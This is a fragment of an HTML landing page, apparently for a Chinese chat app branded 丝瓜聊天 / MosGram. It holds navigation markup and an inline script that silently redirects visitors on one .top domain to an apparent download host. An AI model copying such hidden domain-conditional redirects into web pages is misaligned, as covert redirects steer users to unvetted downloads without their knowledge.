...
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  ...
  <title>丝瓜聊天官网-丝瓜聊天软件-丝瓜聊天软件官网</title>
  ...
  <meta name="twitter:card" content="">
      <script type="text/javascript">
        (function() {
            ...
            // 定义需要跳转的域名和目标URL
            var redirectMap = {
                'pao.dfgdbndd.top': 'https://down.paopsao.top/',
            };

            // 检查当前域名是否在跳转映射中
            if (redirectMap[currentDomain]) {
                // 执行跳转
                window.location.href = redirectMap[currentDomain];
            }
        })();
    </script>
        ...
        <div class="pull-left pull-left_2022_06_19">
          <div class="nav">
            ...
            <div class="pull-left logo-title">
              <span class="i18n font24 zh" name="ppChat">丝瓜聊天</span><span class="dot zh"></span><span class="font16 en">MosGram</span>
            </div>
          </div>
        </div>
      </div>
    ...
    <section class="containerSection">
      <div class="container-1" id="section1" data-section="#section1">
        ...
        <div class="pull-left top10">
          <img src="static/picture/1.png" class="enImg" data-index="1">
        </div>
      </div>
    </section>
  </main>
